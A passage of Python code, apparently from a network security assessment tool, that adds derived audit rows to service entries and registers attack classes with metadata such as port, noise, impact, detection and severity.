    """Append the two derived rows to every service that does not already have them."""
    for entry in SERVICES:
        existing = {row.technique for row in entry.rows}
        base_version = next((row for row in entry.rows
                             if row.technique in ("version", "banner", "discover")), None)
        base_clear = next((row for row in entry.rows
                           if row.technique in ("cleartext", "discover", "anonymous",
                                                "unauth_read", "banner")), None)
        extra: List[Row] = []
        if base_version is not None and "version_audit" not in existing:
            extra.append(version_audit_row(entry, base_version))
        if (base_clear is not None and "cleartext_audit" not in existing
                and entry.protocol in CLEARTEXT_PROTOCOLS):
            extra.append(cleartext_audit_row(entry, base_clear))
        if extra:
            entry.rows = (*entry.rows, *extra)


_derive_cross_cutting_rows()


#: every attack this module contributes, in the order it is documented:
#: the table first (one per service row), then the segment-wide sweeps.
ATTACKS: List[Type[Attack]] = []
REGISTRY: List[Tuple[str, Dict[str, Any], Type[Attack]]] = []

for _service in SERVICES:
    for _row in _service.rows:
        _name = f"it_{_service.protocol}_{_row.technique}"
        _cls = _it_attack_class(_service, _row, _name)
        ATTACKS.append(_cls)
        REGISTRY.append((_name, {
            "category": _row.category, "noise": _row.noise, "impact": _row.impact,
            "detection": _cls.detection, "domain": "it",
            "devices": list(_service.devices), "port": _service.port,
            "protocol": _service.protocol, "technique": _row.technique,
            "severity": _row.severity,
        }, _cls))

for _cls in SWEEP_ATTACKS:
    ATTACKS.append(_cls)
    REGISTRY.append((_cls.name, {
        "category": _cls.category, "noise": _cls.noise, "impact": _cls.impact,
        "detection": _cls.detection, "domain": "it",
        "devices": list(_cls.devices), "port": 0, "protocol": "sweep",
        "technique": "sweep", "severity": _cls.severity,
    }, _cls))

META: Dict[str, Dict[str, Any]] = {name: meta for name, meta, _cls in REGISTRY}
NAMES: List[str] = [name for name, _meta, _cls in REGISTRY]

__all__ += ["ATTACKS", "META", "NAMES", "REGISTRY", "SWEEP_ATTACKS", "SWEEP_PORTS",
            "CREDENTIALS", "ADVISORIES"]
